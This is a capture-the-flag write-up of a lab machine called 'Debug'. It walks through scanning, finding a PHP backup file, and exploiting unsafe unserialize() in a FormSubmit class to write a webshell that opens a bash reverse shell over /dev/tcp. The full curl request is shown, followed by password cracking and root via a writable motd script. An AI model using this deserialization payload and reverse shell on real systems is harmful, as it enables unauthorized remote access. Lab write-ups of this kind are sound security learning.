---
layout: default
title : muzec - Debug Writeup
---

![Image](https://imgur.com/Uns35Qw.png)

We always start with an nmap scan.....

```Nmap -sC -sV -oA nmap <Target-IP>```

```
# Nmap 7.91 scan initiated Sat Apr  3 02:05:29 2021 as: nmap -sC -sV -oA nmap 10.10.142.82
Nmap scan report for 10.10.142.82
Host is up (0.16s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 44:ee:1e:ba:07:2a:54:69:ff:11:e3:49:d7:db:a9:01 (RSA)
|   256 8b:2a:8f:d8:40:95:33:d5:fa:7a:40:6a:7f:29:e4:03 (ECDSA)
|_  256 65:59:e4:40:2a:c2:d7:05:77:b3:af:60:da:cd:fc:67 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Apr  3 02:06:08 2021 -- 1 IP address (1 host up) scanned in 39.31 seconds
```

2 open ports also i scan for full ports but we got only 2 which port 22,80 let hit port 80 which is HTTP.

![Image](https://imgur.com/nE7FFlA.png)

A default apache page hmmm cool let burst some dirs with ffuf.

![Image](https://imgur.com/9Axj68k.png)

The Backup dir look interesting let check it out.

![Image](https://imgur.com/Djxrsm9.png)

Some index backup cool let get it our machine to inspect it well maybe some hidden credentials can be found,so i cat the index.html.bak first and nothing it just the same apache page source code so i cat the index.php.bak.

![Image](https://imgur.com/8kSGvIP.png)

Cool looking interesting let check http://IP/index.php

![image](https://imgur.com/VAfc139.png)

Let go back to the source code with some little research with google found out it vulnerbale to php deserialization and guess what we can exploit it to get RCE yes i mean Remote Code Execution lol.

Here we see that the script looks for a GET input variable `debug` and unserializes it. We might be able to exploit it using PHP Object Deserialization.

Here is a class called `FormSubmit` with a `__destruct` function implemented. This function is what we can use to get RCE. The function uses file_put_contents to write the variable `message` to the file defined in the variable `form_file`. If we go over to the URI IP/message.txt and we got some 200 respond which is success.

Now let exploit it

1. We write the class `FormSubmit` on our local machine, define `form_file` to be a php file and the data to be a php reverse shell to our local machine.

2. We serialize our defined class and pass it as input to the GET variable variable.

3. The input gets passed to deserialize and a new instance of the class is created with our defined variables.

4. At the `__destruct` function, our reverse shell gets written to the root of the web directory to the filename defined by us(shell.php in my case). Now if we go to the URI of the file, we can get a reverse shell.

Let start;

`php -a`

![Image](https://imgur.com/V8JzjN3.png)

```
class FormSubmit {
  public $form_file = 'shell.php';
  public $message = '<?php exec("/bin/bash -c \'bash -i > /dev/tcp/VPN-IP/PORT 0>&1\'"); ?>';
  }

print urlencode(serialize(new FormSubmit));
```

We copy the output of the print command and pass it to the GET variable using curl.

`curl -i 10.10.230.188/index.php?debug=O%3A10%3A%22FormSubmit%22%3A2%3A%7Bs%3A9%3A%22form_file%22%3Bs%3A9%3A%22shell.php%22%3Bs%3A7%3A%22message%22%3Bs%3A72%3A%22%3C%3Fphp+exec%28%22%2Fbin%2Fbash+-c+%27bash+-i+%3E+%2Fdev%2Ftcp%2F10.8.0.156%2F1337+0%3E%261%27%22%29%3B+%3F%3E%22%3B%7D`

Now let start and Ncat listener and access IP/shell.php to get our shell.

`nc -nvlp PORT`

![image](https://imgur.com/U0sWCox.png)

Boom we got shell.

Going to the home dir got some user folder but we have no access to it let enumerate maybe we can get a credentials to log in and yes am right i was able to get the credentials for the user just look around the dir lol.

A user with a hash password time to call john the ripper to crack it i was able to crack it in some min now let use it to ssh into the machine.


![Image](https://imgur.com/KziCUN7.png)

Boom we have user.txt also a Note from the root user.

![image](https://imgur.com/3Dq2Wd8.png)

Cool we have access to modify all these files in the motd (message of the day)  folder.

![Image](https://imgur.com/1jbLQiO.png)

Now let inject our reverse shell payload to the '00-header' file.

![image](https://imgur.com/htVWszd.png)

Let save it and start an ncat listener on our maachine also let log out the ssh and try to log in again.

![Image](https://imgur.com/ZqFeqDu.png)

Now let check our Ncat listener.

![Image](https://imgur.com/CV3CWx9.png)

Boom we are root.

![image](https://imgur.com/Ys9owlP.png)

Greeting From [Muzec](https://twitter.com/muzec_saminu)

<br> <br>
[Back To Home](../index.md)
<br>
